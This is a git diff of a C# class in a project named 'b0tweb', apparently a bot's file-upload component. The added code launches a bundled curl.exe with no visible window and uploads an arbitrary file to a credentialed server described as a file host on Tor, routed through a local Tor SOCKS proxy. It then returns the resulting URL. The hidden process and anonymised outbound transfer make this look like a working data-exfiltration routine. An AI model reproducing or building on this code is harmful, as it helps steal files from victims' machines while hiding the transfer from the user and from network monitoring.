@@ -6,6 +6,7 @@ using System.Net;
 using System.Threading;
 using System.IO;
 using Newtonsoft.Json;
+using System.Diagnostics;
 
 namespace b0tweb
 {
@@ -14,67 +15,6 @@ namespace b0tweb
     /// </summary>
     class HTTPUpload
     {
-        private const string ProxyAddress = "localhost:8118";
-
-        /// <summary>
-        /// Prepare the boundary of the request.
-        /// </summary>
-        /// <param name="request">A <see cref="HttpWebRequest"/> object.</param>
-        /// <param name="filePath">Path to the file to upload.</param>
-        /// <returns>The boundary string</returns>
-        private static string PrepareRequestBoundary(HttpWebRequest request, string filePath)
-        {
-            Stream stream = request.GetRequestStream();
-
-            string boundary = "---------------------------" + DateTime.Now.Ticks.ToString("x");
-            request.ContentType = String.Format("multipart/form-data; boundary={0}", boundary);
-            byte[] boundarybytes = Encoding.ASCII.GetBytes("\r\n--" + boundary + "\r\n");
-            request.GetRequestStream().Write(boundarybytes, 0, boundarybytes.Length);
-
-            string header = String.Format("Content-Disposition: form-data; name=\"{0}\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n",
-                "files[]",
-                Path.GetFileName(filePath),
-                "text/plain");
-
-            byte[] bytes = Encoding.UTF8.GetBytes(header);
-            stream.Write(bytes, 0, bytes.Length);
-
-            return boundary;
-        }
-
-        /// <summary>
-        /// Write the contents of the file located at <c>filePath</c> to the <c>request</c> input stream.
-        /// </summary>
-        /// <param name="request">A <see cref="HttpWebRequest"/> object.</param>
-        /// <param name="filePath">Path to the file to upload.</param>
-        private static void WriteFileContent(HttpWebRequest request, string filePath)
-        {
-            Stream stream = request.GetRequestStream();
-            FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read);
-            byte[] buffer = new byte[4096];
-            int read = 0;
-            while ((read = fileStream.Read(buffer, 0, buffer.Length)) != 0)
-            {
-                stream.Write(buffer, 0, read);
-            }
-
-            fileStream.Close();
-        }
-
-        /// <summary>
-        /// Write the end of the boundary to the <c>request</c> input stream.
-        /// </summary>
-        /// <param name="request">A <see cref="HttpWebRequest"/> object.</param>
-        /// <param name="boundary">The boundary to write.</param>
-        private static void EndRequestBoundary(HttpWebRequest request, string boundary)
-        {
-            Stream stream = request.GetRequestStream();
-            byte[] bytes = System.Text.Encoding.ASCII.GetBytes("\r\n--" + boundary + "--\r\n");
-            stream.Write(bytes, 0, bytes.Length);
-
-            stream.Close();
-        }
-
         /// <summary>
         /// Upload a file to the hosted pomf clone on Tor.
         /// </summary>
@@ -82,44 +22,33 @@ namespace b0tweb
         /// <returns>Empty string if something went wrong, else an URL pointing to a file.</returns>
         public static string Upload(string filePath)
         {
-            // Enable proxy
-            Privoxy privoxy = new Privoxy();
-            privoxy.Establish();
+            string basePath = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);
+            string argument = String.Format(
+                 "--socks5-hostname {0}  -F \"files[]=@{1}\" {2}  --user {3}:{4}",
+                "localhost:9050", //TODO: Move this to tor proxy
+                filePath,
+                Configuration.HTTPServer,
+                Configuration.HTTPUsername,
+                Configuration.HTTPPassword
+            );
 
-            // Set the credentials of the request
-            string username = Configuration.HTTPUsername;
-            string password = Configuration.HTTPPassword;
-            string credentials = Convert.ToBase64String(Encoding.GetEncoding("ISO-8859-1").GetBytes(username + ":" + password));
-
-            //Create the basics of the request
-            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Configuration.HTTPServer);
-            request.Headers.Add("Authorization", "Basic " + credentials);
-            request.Method = "POST";
-            request.Proxy = new WebProxy(HTTPUpload.ProxyAddress);
-            request.KeepAlive = true;
-
-            string boundary = PrepareRequestBoundary(request, filePath);
-            WriteFileContent(request, filePath);
-            EndRequestBoundary(request, boundary);
-
-            string reply = String.Empty;
-            try
+            ProcessStartInfo info = new ProcessStartInfo(basePath + @"\Curl\curl.exe", argument)
             {
-                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
-                {
-                    StreamReader reader = new StreamReader(response.GetResponseStream());
-                    reply = reader.ReadToEnd();
-                }
-            } catch
+                RedirectStandardOutput = true,
+                UseShellExecute = false,
+                CreateNoWindow = true,
+                WindowStyle = ProcessWindowStyle.Hidden
+            };
+
+            Process process = new Process()
             {
-                // TODO: discuss about exceptions
-                return String.Empty;
-            }
+                StartInfo = info
+            };
 
-            privoxy.Disconnect();
-            dynamic json = JsonConvert.DeserializeObject(reply);
+            process.Start();
 
-            // needs to be compared with a type due to it being a dynamic
+            dynamic json = JsonConvert.DeserializeObject(process.StandardOutput.ReadToEnd());
+
             if (json.success == true)
             {
                 return json.files[0].url;
